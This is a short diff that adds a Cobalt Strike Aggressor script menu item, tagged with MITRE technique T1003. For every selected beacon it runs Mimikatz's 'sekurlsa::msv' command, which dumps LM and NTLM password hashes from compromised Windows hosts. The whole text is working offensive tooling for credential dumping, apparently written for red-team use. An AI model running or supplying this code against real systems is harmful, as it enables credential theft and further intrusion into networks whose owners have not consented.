@@ -1,0 +1,13 @@
+item "Mimikatz MSV LM & NTLM Passwords  - T1003"{
+			local('$bid');
+				foreach $bid ($1){
+					msv($bid);
+				}
+			}
+			
+			
+sub msv{
+
+bmimikatz($1, "sekurlsa::msv");
+
+}			
